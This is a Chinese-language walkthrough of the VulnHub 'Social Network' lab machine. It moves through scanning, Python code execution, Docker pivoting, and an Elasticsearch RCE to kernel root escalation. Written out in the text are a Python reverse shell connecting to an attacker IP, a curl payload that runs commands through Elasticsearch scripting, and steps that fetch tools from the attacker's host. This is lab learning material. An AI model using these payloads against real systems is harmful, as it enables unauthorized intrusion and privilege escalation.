# 靶机链接

https://www.vulnhub.com/entry/boredhackerblog-social-network,454/

# 信息收集阶段

进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描

![](https://cos.kevinc.ltd/file/download?fileId=592)

主机发现阶段发现同一网段下有三个资产，第一个大概率是网关，第二个经验证是物理机的地址，猜测第三个地址为靶机地址，接下来要对靶机进行端口的扫描，以发现靶机上跑了什么服务

使用nmap进行端口扫描，第一步是对目标进行端口的发现

![](https://cos.kevinc.ltd/file/download?fileId=593)

发现靶机上开了两个端口，其中一个是22端口（SSH服务），另一个是非常见端口5000。针对SSH服务常见的攻击手法是弱口令、暴破或者利用一些历史版本漏洞进行突破，目前收集的信息尚少。可以对端口进行版本的发现，看看各个端口上跑的是什么服务。

![](https://cos.kevinc.ltd/file/download?fileId=595)

通过版本发现可以得到的信息是：系统为Ubuntu，22端口上跑的是SSH服务，5000端口上跑的是http服务，其中的Werkzeug是一个WSGI的工具包，也可以作为Web框架的底层库，基于Python2来实现。使用searchsploit 寻找关于 Werkzeug 的漏洞，可以找到两三个，均利用不成功。

整理一下目前得到的可用信息：其中SSH可以考虑暴破用户名密码，5000端口上跑了一个网站，可以访问寻找突破口，其中的框架是基于Python来实现的，若有代码执行，可以考虑用Python脚本来执行反弹shell。

# 通过Web漏洞拿shell

尝试访问目标的5000端口，发现是一个交互网站

![](https://cos.kevinc.ltd/file/download?fileId=596)

网站有输入框，但是信息提示 ”绝对安全“， 突破可能性不大。但还是尝试插入了一下XSS payload

```html
<script>alert('justtry')</script>
```

发现还是原样输出到页面，证明该输入框不是突破点，通过查看源代码也找不到什么其他信息。

尝试收集更多的信息，在网站下进行目录扫描，看有没有管理后台或者敏感信息泄露，这里使用的是dirsearch工具

![](https://cos.kevinc.ltd/file/download?fileId=597)

发现 有一个 /admin 路径，尝试访问，页面有代码测试功能，可尝试代码执行。考虑到框架是基于Python 实现的，可以找 Python 的 反弹shell 代码。

![](https://cos.kevinc.ltd/file/download?fileId=598)

在CSDN上找到一段现成的可以直接拿来用的代码

```html
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.43.173",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

执行前 Kali 应该先监听自身的 4444 端口， 然后执行代码，成功回弹！！！

![](https://cos.kevinc.ltd/file/download?fileId=599)

在这里其实还遇到一个小问题，就是当 shell 是 /bin/bash 的时候，回弹的时候没有回显，于是尝试换成 sh ， 回弹就有回显了，我也不知道为什么。

拿下 shell 后 先看看自己的权限， 发现是 root， 就这？

![](https://cos.kevinc.ltd/file/download?fileId=600)

然后去看系统中存在什么文件，发现很不对劲，文件中存在Dockerfile文件，Dockerfile 是 docker 部署的一个模板文件。 初步断定闹了半天拿下的是一个docker 容器的 shell。

![](https://cos.kevinc.ltd/file/download?fileId=601)

可以尝试使用以下两个命令来查证是否docker 容器

```bash
ls /.dockerenv
# 根目录下若存在dockerenv， 基本上可断定为docker容器
cat /proc/1/cgroup
# pid为1是初始化进程，若初始化进程中包含了docker映像的信息，可确认为docker容器
```

确认为 docker 容器后，下一步是如何从 docker容器中 突破出来，最终拿到服务器的 权限。

# 内网穿透

确认容器地址， 为 172 开头的地址

![](https://cos.kevinc.ltd/file/download?fileId=602)

可以将容器地址看作内网地址，可以在内网中进行主机发现，看看是否还存在其他容器。

最简单进行主机发现的方法是一个个 IP 地址 去 ping， 但手工操作其实很麻烦，尝试用shell脚本完成操作

![](https://cos.kevinc.ltd/file/download?fileId=603)

可以发现 很快就有三个 IP 回包了， 接下来的都没有回包， 初步收集到 内网网段 三个地址。

已知 172.17.0.2 为容器地址，想要用Kali对另外两个地址进行信息收集，必须进行内网穿透，把Kali 到内网的路由 打通， 这里 用到 内网穿透工具 Venom。

首先在 Kali 上运行服务端程序 启动侦听

![](https://cos.kevinc.ltd/file/download?fileId=604)

为了让 目标靶机 能 获取到Venom客户端程序，在 Kali 目录下 开启 http 服务， 然后在目标靶机上使用 wget 来获取

![](https://cos.kevinc.ltd/file/download?fileId=605)

![](https://cos.kevinc.ltd/file/download?fileId=606)

获取客户端程序后，赋予程序可执行权限。用客户端连接远程 Kali 机器

![](https://cos.kevinc.ltd/file/download?fileId=607)

可以看到程序成功执行， 跟服务端的连接也建立起来了。在服务器端，通过 show 命令 可以看到已经有一个节点 连接上来了，可以 goto 到 此节点

并启用一个监听1080 端口的 socks 代理，Kali 的 所有工具 可以通过 proxychains 这个工具 挂上这个代理去访问 容器内网的整个网段

![](https://cos.kevinc.ltd/file/download?fileId=608)

修改proxychains 配置文件，把代理类型改成 socks5， 代理端口 改成 1080

![](https://cos.kevinc.ltd/file/download?fileId=609)

挂载好后，以 proxychains 为前缀，就可以对内网的主机 进行端口扫描了

```bash
proxychains nmap -sT -Pn 172.17.0.1
# -Pn  代表不进行主机发现， 直接对目标进行深层次的扫描
# -sT 进行TCP扫描
```

扫描得出 172.17.0.1 开放的端口 跟 目标靶机 开放的端口一样， 都是22 和 5000浏览器挂代理后对172.17.0.1的5000端口进行访问

![](https://cos.kevinc.ltd/file/download?fileId=610)

继续对服务版本进行探测，发现 跟 目标靶机的 服务版本也完全一模一样。浏览器挂载代理后，访问172.17.0.1的5000端口，发现页面 也跟我们直接访问靶机地址的一模一样，可以确定172.17.0.1就是目标靶机，只不过该地址是靶机面向容器内网的地址。

继续对172.17.0.3 进行端口扫描， 发现开了9200 端口， 对服务进行探测后发现是Elasticsearch

![](https://cos.kevinc.ltd/file/download?fileId=611)

针对服务搜寻漏洞

```bash
searchsploit Elasticsearch
```

![](https://cos.kevinc.ltd/file/download?fileId=612)

发现有RCE可做利用，将漏洞利用代码拷贝到当前目录下，简单看一下脚本的执行例子。

可先尝试一下执行脚本，一般脚本在注释或者报错提示里都有脚本执行的格式，按照格式一步一步来

第一次利用脚本36337.py的时候会报错，原因是elasticsearch服务里面没有数据，所以不能通过elasticsearch来搜索进而执行命令。

解决方法是先插入一条数据，再进行脚本的利用。

```shell
proxychains curl -XPOST 'http://172.17.0.3:9200/twitter/user/yren' -d '{ "name" : "Wu" }'
```

```shell
proxychains curl -XPOST 'http://172.17.0.3:9200/_search?pretty' -d '{"script_fields": {"payload": {"script": "java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getText()"}}}'
```

![](https://cos.kevinc.ltd/file/download?fileId=613)

成功拿到第二台容器的shell，查看权限，发现也是 root （没什么卵用）

在目录中发现一个敏感文件 passwords， 有可能是密码文件

查看文件，发现密码做了哈希， 去 somd5 尝试破解

![](https://cos.kevinc.ltd/file/download?fileId=614)

解密完密码后，可尝试使用账号密码去登录目标靶机的SSH

发现 John 用户 可直接登录到 目标靶机的 22 端口， 尝试用 sudo -s 提权，发现 John 并不能直接提升为 root 权限

# 利用内核漏洞提权

此时需要考虑使用系统内核漏洞去提权

![](https://cos.kevinc.ltd/file/download?fileId=615)

使用 searchsploit 搜索 LInux 3.13 相关的漏洞利用代码， 选用 37292.c 这个 exp，但这个 exp 有个问题。首先目标靶机上是没有装 gcc 的， 也就是说 所有的c语言代码只能在 Kali 机器上进行编译。在查看 EXP 的过程中， 发现有一段代码编译了一个c文件成so文件，再对这个so文件进行调用 —— 意味着就算在 Kali 上对 EXP 进行了编译，放到目标靶机上仍无法执行成功。

解决的思路是：修改EXP 代码， 将编译相关的代码段去掉， 然后直接找到编译好的so文件进行调用。

![](https://cos.kevinc.ltd/file/download?fileId=616)

![](https://cos.kevinc.ltd/file/download?fileId=617)

同样是在 Kali 上启用 http 服务，然后在目标主机上获取到需要的文件

为了执行的方便，在获取到 exp 和 so 文件后，将文件移动到 /tmp 目录去执行

先给 exp 赋予可执行权限 ，然后执行。 在执行的过程中，exp 会去调用 目录下的 so文件进行提权，执行结束后 使用 id 命令查看权限， 已经 拿到了目标 靶机的 root 权限了

![](https://cos.kevinc.ltd/file/download?fileId=618)



# 思路总结

面对靶机，首先是进行主机发现。

针对发现的主机，要进行端口扫描和端口服务的发现。

若服务中有Web应用，尝试在 Web 应用中找突破点，在该靶机中，我们遇到了一个代码执行，并通过Python脚本成功获得了一个反弹shell，但通过对系统文件的搜寻发现被困在一个容器系统中。

使用 ICMP 对容器系统中的资产进行发现，发现了另外两个地址。

为了使用 Kali 的工具对内网 的容器系统进行渗透，利用Venom工具建立了从Kali 到容器内网的隧道，并在 Kali 上开启了 监听1080端口 的代理。通过proxychains 挂载这个代理在Kali 上访问内网。

发现其中一个资产开启了9200端口，判断为 Elasticsearch 服务，通过对其漏洞的利用拿下第二个docker容器的shell，并在该容器中发现了密码文件。

利用密码文件破译出的账号密码尝试登录目标系统的SSH并成功登录，却发现自己只是一个普通用户。

考虑到内核版本比较老，尝试通过内核漏洞进行提权。

由于EXP中调用了gcc进行C文件的编译，所以把关于编译的代码全部删掉，直接找到编译好的so文件进行直接调用。

最终成功获得目标主机的root权限！！！

耶！